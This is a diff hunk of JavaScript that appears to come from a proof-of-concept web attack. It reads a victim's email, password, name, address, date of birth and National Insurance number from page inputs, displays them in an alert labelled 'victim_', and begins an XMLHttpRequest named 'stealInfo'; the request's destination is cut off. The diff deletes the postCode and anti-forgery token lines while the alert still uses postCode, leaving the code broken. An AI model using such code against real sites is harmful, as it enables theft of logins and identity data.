@@ -25,11 +25,8 @@ req1.onreadystatechange = function()
         var SecondLineAddress = document.getElementsByTagName("input")['SecondLineAddressInput'].value;
         var Town = document.getElementsByTagName("input")['TownInput'].value;
         var Country = document.getElementsByTagName("input")['CountryInput'].value;
-        var postCode = document.getElementsByTagName("input")['PostcodeInput'].value;
         var DateOfBirth = document.getElementsByTagName("input")['DateOfBirthInput'].value;
         var NationalInsuranceNumber = document.getElementsByTagName("input")['NationalInsuranceNumberInput'].value;
-        var token = document.getElementsByTagName("input")['__RequestVerificationToken'].value;
-        var ufprt = document.getElementsByTagName("input")['ufprt'].value;
         alert('victim_Email = ' + Email + '\n' + 'victim_Password = ' + Password + '\n' + 'victim_FirstName = ' + FirstName + '\n' + 'victim_SurName =' + SurName + '\n' + 'victim_ContactNo = ' + ContactNo + '\n' + 'victim_NationalInsuranceNumber = ' + NationalInsuranceNumber + '\n' + 'victim_FirstLineAddress = ' + FirstLineAddress + '\n' + 'victim_SecondLineAddress = ' + SecondLineAddress + '\n' + 'victim_Town = ' + Town + '\n'+ 'victim_Country = ' + Country + '\n' + 'victim_postCode = ' + postCode);
         
         var stealInfo = new XMLHttpRequest();
